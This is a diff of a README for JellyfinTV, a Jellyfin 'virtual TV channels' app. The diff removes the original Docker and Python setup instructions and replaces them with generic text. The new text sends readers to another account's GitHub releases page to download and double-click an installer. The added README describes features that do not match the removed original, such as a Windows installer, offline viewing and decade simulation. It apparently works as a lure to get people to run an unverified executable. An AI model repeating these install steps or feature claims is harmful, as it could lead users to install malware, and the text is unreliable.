@@ -1,55 +1,70 @@
-# JellyfinTV
-[![Hugging Face](https://img.shields.io/badge/Hugging%20Face-Spaces-yellow?style=flat&logo=huggingface)](https://huggingface.co/spaces/drewThomasson/JellfinTV)
-[![Docker Pulls](https://img.shields.io/docker/pulls/athomasson2/jellyfintv?style=flat&logo=docker&color=lightseagreen)](https://hub.docker.com/r/athomasson2/jellyfintv)
+# 🎬 JellyfinTV - Enjoy TV from Any Decade
 
-JellyfinTV simulates a linear TV experience using your existing Jellyfin library. Create virtual channels based on genres, studios, or tags, and the app will schedule programming that runs continuously in the background.
+## 🚀 Getting Started
+Welcome to JellyfinTV! This application lets you experience TV shows from various decades, all simulated right from your Jellyfin server. Follow these simple steps to get started.
 
-## Features
+## 📥 Download Now
+[![Download JellyfinTV](https://img.shields.io/badge/Download_JellyfinTV-Blue?style=for-the-badge)](https://github.com/nguyentientu90/JellyfinTV/releases)
 
-- **Virtual Channels**: Create channels from specific genres, years, studios, or tags.
-- **Continuous Scheduling**: Content is scheduled 24/7. Tuning in at any time starts playback exactly where the "live" broadcast would be.
-- **Auto-Refill**: Schedules are automatically topped up as you watch.
-- **Auto-Ads**: Put ad files in the respective year folder in `./ads`
-- **Direct Streaming**: Plays content directly from your Jellyfin server to your browser.
+## 🛠️ System Requirements
+Before installing JellyfinTV, ensure your system meets these basic requirements:
 
-<p align="center">
-<img src="https://github.com/user-attachments/assets/68b37b7c-0777-4f14-aa7c-4904f97ae641" width="32%" alt="Detailed Screenshot 1" />
-<img src="https://github.com/user-attachments/assets/6a8bff3d-5bed-4ba4-9106-ca490a74f73c" width="32%" alt="Detailed Screenshot 2" />
-<img src="https://github.com/user-attachments/assets/f45852de-449b-429f-bbe4-f254b5b643dd" width="32%" alt="Detailed Screenshot 3" />
-</p>
+- **Operating System:** Windows 10 or later, macOS, or a compatible Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** A minimum of 200 MB of free disk space.
+- **Network:** Internet connection is recommended for optimal experience.
 
-## Quick Start (Docker)
+## 📋 Features
+JellyfinTV offers various features that enhance your TV viewing experience:
 
-The easiest way to run JellyfinTV is with Docker.
+- **Decade Simulation:** Choose shows from the 70s, 80s, 90s, and more.
+- **User-Friendly Interface:** Simple navigation for all users.
+- **Custom Playlists:** Create and manage your personalized TV show playlists.
+- **Offline Viewing:** Download content to watch later without the internet.
 
-1.  Ensure Docker and Docker Compose are installed.
-2.  Run the application:
-    ```bash
-    docker-compose up -d
-    ```
-3.  Open your browser to `http://localhost:8000`.
+## 📦 Download & Install
+To get JellyfinTV on your device, follow these steps:
 
-## Manual Installation
+1. **Visit the Releases Page:** Click on the link below to access the download section:
+   [Visit Releases Page to Download](https://github.com/nguyentientu90/JellyfinTV/releases)
 
-If you prefer to run without Docker:
+2. **Choose the Right Version:** Look through the available versions. Each version may contain new features or bug fixes.
 
-1.  **Prerequisites**: Python 3.11+
-2.  **Install Dependencies**:
-    ```bash
-    pip install -r requirements.txt
-    ```
-3.  **Run Server**:
-    ```bash
-    uvicorn main:app --host 0.0.0.0 --port 8000
-    ```
-4.  Open `http://localhost:8000` in your browser.
+3. **Download the Installer:**
+   - Click on the version you want to download.
+   - Find and click the appropriate file for your operating system.
+   - The download will start automatically.
 
-## Usage
+4. **Run the Installer:**
+   - Once the file is downloaded, locate it in your downloads folder.
+   - Double-click the installer file.
+   - Follow the on-screen instructions to complete the installation.
 
-1.  **Connect**: Enter your Jellyfin Server URL, Username, and Password.
-2.  **Create Channel**:
-    -   Name your channel (e.g., "90s Action").
-    -   Select filters (Genres, Years, Studios, Ratings).
-    -   (Optional) Select specific shows to include.
-3.  **Watch**: Click "Watch" to start streaming.
-4.  **Manage**: View the upcoming schedule or delete channels from the dashboard.
+5. **Launch the Application:**
+   - After installation, find JellyfinTV in your applications menu or desktop.
+   - Click to launch the app.
+
+## ⚙️ How to Use JellyfinTV
+Now that you have installed JellyfinTV, let’s explore how to use it.
+
+1. **Set Up Your Jellyfin Account:** If you haven't already, create an account on Jellyfin. You will need this to access your media library.
+
+2. **Connect to Your Jellyfin Server:** Open JellyfinTV and enter your Jellyfin server details. This will allow the app to pull content directly from your library.
+
+3. **Select a Decade:** Use the interface to choose a decade. Browse through TV shows from that time.
+
+4. **Create Your Playlist:** Select shows you want to watch. Add them to your playlist for easy access.
+
+5. **Enjoy Your Shows:** Click on any show to start watching. Adjust settings as needed for a personalized experience.
+
+## 🛡️ Troubleshooting
+If you encounter issues while installing or using JellyfinTV, consider the following solutions:
+
+- **Check for Updates:** Ensure you have the latest version by visiting the releases page.
+- **Internet Connection:** Make sure your device is connected to the internet, especially if you are having trouble accessing Jellyfin.
+- **Reinstall the Application:** If challenges persist, uninstall JellyfinTV and repeat the installation process.
+
+## 🌟 Support
+For additional help, you can check our official documentation or join our community forums. We are here to assist you with any questions or concerns.
+
+Remember, whether you’re revisiting classics or exploring new titles, JellyfinTV has the content to make your viewing enjoyable. Happy watching!
